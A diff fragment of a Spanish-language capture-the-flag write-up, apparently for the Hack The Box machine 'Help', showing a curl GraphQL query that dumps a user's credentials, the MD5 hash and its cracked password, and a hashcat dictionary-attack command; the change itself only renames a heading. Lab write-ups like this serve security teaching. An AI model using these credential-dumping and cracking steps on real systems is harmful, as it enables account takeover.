@@ -43,7 +43,7 @@ curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username,
 Nos da el usuario: helpme@helpme.com
 Contraseña:  5d3c93182bb20f07b994a7f617e99cff                          |      Contraseña final: godhelpmeplz
 
-##  [[Hashcat (Crackeo de contraseñas)]]
+##  [[Hashcat]]
 ```shell
 hashcat -a 0 -m 0 "5d3c93182bb20f07b994a7f617e99cff" /usr/share/wordlists/rockyou.txt
 ```
